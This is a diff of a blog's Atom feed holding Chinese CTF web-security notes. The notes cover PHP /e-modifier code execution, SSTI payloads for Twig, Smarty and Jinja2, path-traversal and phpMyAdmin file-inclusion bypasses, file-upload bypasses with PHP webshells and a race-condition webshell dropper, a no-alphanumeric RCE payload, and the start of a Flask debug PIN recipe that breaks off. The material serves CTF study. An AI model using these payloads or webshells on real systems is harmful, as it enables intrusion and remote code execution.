@@ -5,8 +5,8 @@
   
   <entry>
     <title>[object Object]</title>
-    <link href="/blogs/uncategorized/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
-    <url>/blogs/uncategorized/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
+    <link href="/blogs/uncategorized/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
+    <url>/blogs/uncategorized/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
     
     <content type="html"><![CDATA[<h2 id="preg-match的-e模式"><a href="#preg-match的-e模式" class="headerlink" title="preg_match的&#x2F;e模式"></a>preg_match的&#x2F;e模式</h2><p><a href="https://xz.aliyun.com/t/2557?time__1311=n4+xni0=G=i=0QDCD0Qxl1aXWue=TDRDmqrAPhD">https://xz.aliyun.com/t/2557?time__1311=n4%2Bxni0%3DG%3Di%3D0QDCD0Qxl1aXWue%3DTDRDmqrAPhD</a></p><p>preg_match(pattern, 替换成的字符串, str)<br>当pattern中采用了&#x2F; &#x2F; ..e模式时，每当str中匹配到pattern，就会把参数2当做代码执行。</p><ol><li>参数2可控 —&gt; 直接执行命令</li><li>参数2固定格式，如</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">url?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls&quot;)<br></code></pre></td></tr></table></figure><p><code>\\1</code>是正则表达式中的第一个捕获项，由于表达式是(\S*)，$str均被匹配,因此<br>执行的是<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code><br>接下来回答以下几个问题<br><strong>Q1：</strong> 为什么不使用.*匹配<br>A: 以下这些字符作为变量名时,会被替换成’_’,其中就包括了字符’.’<br><img src="/blogs/image.png" alt="alt text"></p><p><strong>Q2:</strong> 为什么要用${getFlag()}而不用getFlag()?<br>A: 因为如果用后者,那么将执行<code>strtolower(&quot;getFlag()&quot;)</code>,其中getFlag()只是普通的字符串.而执行<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code>, 其中${}的格式是<a href="https://www.php.net/manual/zh/language.variables.variable.php">可变变量</a><br>,也就是会先自动解析{}中的变量,然后再把它作为变量名.显然$flag{…}是未定义的变量,也就是null.所以得到flag依赖于getFlag()函数中将flag打印出来<br><strong>Q3:</strong> 为什么不能直接<code>url?\S*=$&#123;system(&#39;ls&#39;)&#125;</code>?<br>A: 经测试会报错 unexpected “ls”</p><p>可能与<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code>中把<code>&#39;</code>和<code>&quot;</code>都用掉了有关系,导致<br>$str这个参数不能出现引号.</p><p>奇怪的是<code>url?\S*=$&#123;system(ls)&#125;</code>意外的可以运行<br>但是<code>ls /</code>又不能运行, … 暂时不深究</p>]]></content>
     
@@ -17,37 +17,49 @@
   
   
   <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
-    <url>/blogs/uncategorized/%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
+    <title>[object Object]</title>
+    <link href="/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
+    <url>/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
     
     <content type="html"><![CDATA[<p><img src="/blogs/image-3.png" alt="alt text"></p><h2 id="twig模板注入"><a href="#twig模板注入" class="headerlink" title="twig模板注入"></a>twig模板注入</h2><p><a href="https://xz.aliyun.com/news/9506">https://xz.aliyun.com/news/9506</a></p><ol><li>1.x版本payload: <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > flag.php")&#125;&#125;</code></li><li>2.x&#x2F;3.x 版本payload：<code>&#123;&#123;["ls"]|map("system")&#125;&#125;</code>或者<code>&#123;&#123;["id"]|filter("system")&#125;&#125;</code>或者<code>&#123;&#123;["id", 0]|sort("system")&#125;&#125;</code>或者<code>&#123;&#123;[0, 0]|reduce("system", "id")&#125;&#125;</code></li></ol><h2 id="smarty模板注入"><a href="#smarty模板注入" class="headerlink" title="smarty模板注入"></a>smarty模板注入</h2><p><a href="https://xz.aliyun.com/t/12220?time__1311=GqGxRDcGD=G==GN4eeqBK0QFIpnDgiQQWoD">https://xz.aliyun.com/t/12220?time__1311=GqGxRDcGD%3DG%3D%3DGN4eeqBK0QFIpnDgiQQWoD</a></p><p>曾经用到的方法：</p><ol><li>{if PHP代码}{&#x2F;if}<br> 如 {if system(‘cat &#x2F;flag’)}{&#x2F;if}</li></ol><h2 id="python模板注入漏洞"><a href="#python模板注入漏洞" class="headerlink" title="python模板注入漏洞"></a>python模板注入漏洞</h2><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><h2 id="jinja"><a href="#jinja" class="headerlink" title="jinja"></a>jinja</h2><p><a href="https://xz.aliyun.com/news/6481">各种过滤</a><br><code>__globals__[&#39;os&#39;]</code>可以用<code>__globals__.os</code>直接代替,省去了中括号引号</p>获取配置<p><a href="https://buuoj.cn/challenges#[WesternCTF2018]shrine">配置被手动置为none</a>时，可以从其他的地方访问config，由于他们不会被同时置为none，因此还保留原有配置。<br>payload:<br><code>&#123;&#123;self.__dict__&#125;&#125;</code><br><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></p><h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><pre><code class="hljs">可以直接用undefined这个类，而且里面有很多可用函数，如 </code></pre><p><code>&#123;&#123;a.__init__.__globals__.__builtins__.eval(\"__\\x69mport__('o'+'s').popen('ls /').read()\")&#125;&#125;</code><br><code>self[&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;__buil&#39;&#39;tins__&#39;][&#39;__impo&#39;&#39;rt__&#39;](&#39;o&#39;&#39;s&#39;).popen(&#39;ls;ls /;nl /flag&#39;).read()</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;fla&#39;+&#39;g&#39;,&#39;r&#39;).read()</code><br>    ，甚至不用找可用的类……<br><strong>常见payload</strong></p><ol><li><p><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['o'+'s'].popen('ls').read()&#125;&#125;</code></p></li><li><p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')&#125;&#125;</code></p></li><li><p><code>&#123;&#123;''.__class__.__mro__[0].__subclasses__()[40]("fl4g").read()&#125;&#125;</code>，其中[40]是file类</p></li><li><p><code>&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__\\x69mport__(&#39;os&#39;).popen(&#39;cat+/flag&#39;).read()\&quot;)</code><br> 132指warnings.catch_warnings</p></li></ol><p>当request没被过滤时,用request绕过</p><p><strong>原理解释</strong></p><p>Python复制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-built_in">id</span> = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)<br>    html = <span class="hljs-string">&#x27;&lt;h3&gt;%s&lt;/h3&gt;&#x27;</span>%(<span class="hljs-built_in">id</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(html)<br></code></pre></td></tr></table></figure><p>某些渲染器如python-jinja会将<code>&#123;&#123;&#125;&#125;</code>内包围的内容视为变量，因此会先计算变量（本质上就是执行），因此可以在<code>&#123;&#123;&#125;&#125;</code>中写入想要执行的代码，这里的参数id可能比较特殊，参数值直接写在当前目录下就行。</p><p>接下来就要找到os模块，利用popen函数来获取文件内容（popen用于执行命令，将执行结果输入到文件中，并返回这个文件对象）。</p><p><code>__class__</code> 用于访问当前类，<code>__mro__</code> 访问当前类的基类，最后一个一般是object类，是所有类的基类，<code>__subclasses__()</code>方法返回基于当前类的所有之类，到这里可以得到所有可以用到的类，[71]中的数字可以用爆破的方式<code>&#123;&#123;url/"".__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os']&#125;&#125;</code>得到，目的是得到一个包含了，<code>__init__.__globals__</code>可以获得该类所在模块中的所有用到的全局变量，包括在该模块中引用的模块，返回类型是字典。</p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>fenjing</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤关键词，如<code>os, eval</code>,可以用字符串拼接绕过<br>如<code>[&#39;ev&#39;+&#39;al&#39;]</code></p><p>引号内的字符还可以使用hex或unicode编码绕过<br>如<code>[&#39;eval&#39;] --&gt; [&#39;\x65val&#39;]</code><br>由于python会对字符串自动转义一次,写\x65 等于写 e,因此要写成<code>[&#39;\\x65val&#39;]</code>,这样真正发送的才是\x65</p><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p><a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">文章</a></p><p>利用config保存，set设置，逐步简短最终payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.update(a=config.update)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(b=lipsum.__globals__)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(c=config.b.os)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(d=config.c.popen)%&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
     
     
+    <categories>
+      
+      <category>SSTI</category>
+      
+    </categories>
+    
     
   </entry>
   
   
   
   <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/%E6%8B%BF%E5%88%B0%E9%A2%98%E7%9B%AE%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
-    <url>/blogs/uncategorized/%E6%8B%BF%E5%88%B0%E9%A2%98%E7%9B%AE%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF/</url>
+    <title>[object Object]</title>
+    <link href="/blogs/tricks/%E6%8B%BF%E5%88%B0%E9%A2%98%E7%9B%AE%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
+    <url>/blogs/tricks/%E6%8B%BF%E5%88%B0%E9%A2%98%E7%9B%AE%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF/</url>
     
     <content type="html"><![CDATA[<p>目录扫描<br>git源码泄露<br>备份文件<br>没信息的时候记得看一眼bp 。。。<br>看看有没有附件或者提示。。。</p>]]></content>
     
     
+    <categories>
+      
+      <category>tricks</category>
+      
+    </categories>
+    
     
   </entry>
   
   
   
   <entry>
-    <title></title>
+    <title>[object Object]</title>
     <link href="/blogs/uncategorized/%E7%BD%91%E9%A1%B5%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E8%AE%BF%E9%97%AE/"/>
     <url>/blogs/uncategorized/%E7%BD%91%E9%A1%B5%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E8%AE%BF%E9%97%AE/</url>
     
-    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/593376086">https://zhuanlan.zhihu.com/p/593376086</a></p><p>![[Pasted image 20250115115548.png]]</p><ol><li><p>通过 &#x2F;..&#x2F; 的方式访问<br> 适合于只对url的开头部分做判断的场景<br> 如: <code>if(uri.startsWith(&quot;/system/login&quot;)) &#123; return true&#125;</code> 或 <code>if(uri.startsWith(&quot;flag.php&quot;)) &#123; return false&#125;</code></p><p> 先访问一个肯定不被黑名单的文件<br> 然后用&#x2F;..&#x2F;回到上一个目录,再访问flag.php</p><p> payload:<a href="http://localhost/test/test.php?file=abadlfjaweoikljfladsfja/../flag.php">http://localhost/test/test.php?file=abadlfjaweoikljfladsfja/../flag.php</a></p><p> 白名单应用: <a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">phpmyadmin文件包含漏洞</a><br> 由于phpadmin只检查?前的文件是否在白名单内<br> <code>/phpmyadmin/index.php?target=db_sql.php?/../../../../../../../../../../etc/passwd</code><br> 可以通过将木马写入表格中后包含 .frm文件或者写入session文件并包含session文件<a href="https://blog.csdn.net/weixin_44037296/article/details/111039461">getshell</a></p></li><li><p>在目标页面后添加 “;bypass”<br> 适合于对url结尾部分做判断的场景<br>  如: uri.endsWith(“.do”)||uri.endsWith(“.action”)</p></li><li><p>在url后添加’&#x2F;‘<br> 不影响访问,即&#x2F;flag.html和&#x2F;flag.html&#x2F;是一样的</p></li><li><p>url编码绕过:<br> 当先过滤再url解码时有用<br> 可能需要多重url编码</p><p> 浏览器搜索框和burpsuite会自动对url进行解码一次，因此在这二者中需要多编码一次。</p></li></ol>]]></content>
+    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/593376086">文章</a></p><p>![[Pasted image 20250115115548.png]]</p><ol><li><p>通过 &#x2F;..&#x2F; 的方式访问<br> 适合于只对url的开头部分做判断的场景<br> 如: <code>if(uri.startsWith(&quot;/system/login&quot;)) &#123; return true&#125;</code> 或 <code>if(uri.startsWith(&quot;flag.php&quot;)) &#123; return false&#125;</code></p><p> 先访问一个肯定不被黑名单的文件<br> 然后用&#x2F;..&#x2F;回到上一个目录,再访问flag.php</p><p> payload:<a href="http://localhost/test/test.php?file=abadlfjaweoikljfladsfja/../flag.php">http://localhost/test/test.php?file=abadlfjaweoikljfladsfja/../flag.php</a></p><p> 白名单应用: <a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">phpmyadmin文件包含漏洞</a><br> 由于phpadmin只检查?前的文件是否在白名单内<br> <code>/phpmyadmin/index.php?target=db_sql.php?/../../../../../../../../../../etc/passwd</code><br> 可以通过将木马写入表格中后包含 .frm文件或者写入session文件并包含session文件<a href="https://blog.csdn.net/weixin_44037296/article/details/111039461">getshell</a></p></li><li><p>在目标页面后添加 “;bypass”<br> 适合于对url结尾部分做判断的场景<br>  如: uri.endsWith(“.do”)||uri.endsWith(“.action”)</p></li><li><p>在url后添加’&#x2F;‘<br> 不影响访问,即&#x2F;flag.html和&#x2F;flag.html&#x2F;是一样的</p></li><li><p>url编码绕过:<br> 当先过滤再url解码时有用<br> 可能需要多重url编码</p><p> 浏览器搜索框和burpsuite会自动对url进行解码一次，因此在这二者中需要多编码一次。</p></li></ol>]]></content>
     
     
     
@@ -56,38 +68,37 @@
   
   
   <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
-    <url>/blogs/uncategorized/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <title>[object Object]</title>
+    <link href="/blogs/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+    <url>/blogs/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
     
     <content type="html"><![CDATA[<p><a href="#%E4%B8%8A%E4%BC%A0%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87">上传拦截绕过</a><br><a href="##%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89">条件竞争</a></p><h2 id="上传拦截绕过"><a href="#上传拦截绕过" class="headerlink" title="上传拦截绕过"></a>上传拦截绕过</h2><h3 id="1-黑名单"><a href="#1-黑名单" class="headerlink" title="1. 黑名单"></a>1. 黑名单</h3><p><strong>黑白名单判断：</strong><br>传递一个不存在的后缀，如果能上传说明是黑名单<br>如果是黑名单，可以遍历可利用的后缀字典，看看有没有漏掉过滤的。</p><h3 id="2-MIME类型检测"><a href="#2-MIME类型检测" class="headerlink" title="2. MIME类型检测"></a>2. MIME类型检测</h3><h3 id="3-文件头检测"><a href="#3-文件头检测" class="headerlink" title="3. 文件头检测"></a>3. 文件头检测</h3><h3 id="4-配置文件覆盖"><a href="#4-配置文件覆盖" class="headerlink" title="4. 配置文件覆盖"></a>4. 配置文件覆盖</h3><p>如果能上传.ini文件或者.htaccess文件。<br><strong>.htaccess文件不要有 GIF89A ！！！</strong><br><strong>不然会报语法错误500！！</strong></p><h3 id="5-文件内容过滤"><a href="#5-文件内容过滤" class="headerlink" title="5. 文件内容过滤"></a>5. 文件内容过滤</h3><p>a. 过滤&lt;?   –&gt;   script 绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-title function_ invoke__">phpinfo</span>();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>b. 有时还会碰到这种奇葩条件<br>![[Pasted image 20250120113841.png]]</p><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ol><li>白名单</li><li>先传到服务器再删除</li><li>文件上传路径已知<br><strong>payload</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cmd.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一手发包，一手访问上传的文件<br>如果上传的文件还没被删除，就被访问到，那么这段代码就会生成一个cmd.php，从而访问cmd.php得到webshell</p>]]></content>
     
     
+    <categories>
+      
+      <category>文件上传</category>
+      
+    </categories>
+    
     
   </entry>
   
   
   
   <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/"/>
-    <url>/blogs/uncategorized/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</url>
+    <title>[object Object]</title>
+    <link href="/blogs/RCE/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/"/>
+    <url>/blogs/RCE/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</url>
     
     <content type="html"><![CDATA[<h2 id="题目-RCE-ME"><a href="#题目-RCE-ME" class="headerlink" title="题目: RCE ME"></a>题目: <a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]RCE%20ME">RCE ME</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/Br&gt;&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&quot;&lt;/Br&gt;&quot;</span>;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ol><li>字符串取反绕过</li><li>字符串异或(同上)</li></ol><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>B)(~<span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>第一个字符括号内的结果是<code>assert</code>,<br>第二个括号内结果是<code>eval($_POST[1])</code></p><p>执行顺序是</p><ol><li>解析变量 得到 <code>assert</code> 和 <code>eval($_POST[1])</code></li><li>调用eval,解析变量</li><li>调用assert,执行代码</li></ol><h2 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h2><ol><li><p>为什么不能直接构造<code>$_POST[1]</code>,而要加上<code>assert(eval(..))</code>?</p><p> <strong>A:</strong><br> 直接构造<code>$_POST[1]</code>,执行的是</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$_POST[1]&#x27;</span>);<br></code></pre></td></tr></table></figure><p> 作用仅限于解析了POST变量1<br> 而不是所期望执行的</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p> 先取得变量,再执行代码.</p></li><li><p>为什么不能直接构造<code>eval($_POST[1])</code>?<br> <strong>A:</strong><br> 如果可以使用字母,直接传递<code>?code=eval($_POST[1]);</code>,可以达到效果,第一层eval获取了变量,第二层eval执行代码<br> 但是不能使用字母时,由于<strong>eval不是一个php函数,而是语言构造器,不能采用可变函数的方式调用</strong>,同样的,echo、include…也不行。详情见<a href="https://www.php.net/manual/zh/functions.variable-functions.php">php可变函数</a></p></li></ol>]]></content>
     
     
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E8%A7%88/"/>
-    <url>/blogs/uncategorized/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E8%A7%88/</url>
-    
-    <content type="html"><![CDATA[<p>linux提权</p><ul><li>suid<ul><li>find</li><li>bash</li></ul></li></ul>]]></content>
-    
+    <categories>
+      
+      <category>RCE</category>
+      
+    </categories>
     
     
   </entry>
@@ -95,25 +106,18 @@
   
   
   <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/flask%20debug%E6%A8%A1%E5%BC%8F/"/>
-    <url>/blogs/uncategorized/flask%20debug%E6%A8%A1%E5%BC%8F/</url>
+    <title>[object Object]</title>
+    <link href="/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/"/>
+    <url>/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/</url>
     
     <content type="html"><![CDATA[<ol><li>服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得</li><li>module name 一般不变就是flask.app</li><li>getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变</li><li>flask库下app.py的绝对路径。通过报错信息就会泄露该值。</li><li>mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address获得</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;1e:eb:d7:36:97:1e&#x27;</span>));<br></code></pre></td></tr></table></figure><ol start="6"><li>机器的id。<br> linux<br> &#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i<br> docker<br> &#x2F;proc&#x2F;self&#x2F;cgroup：</li></ol><p>pin码计算脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 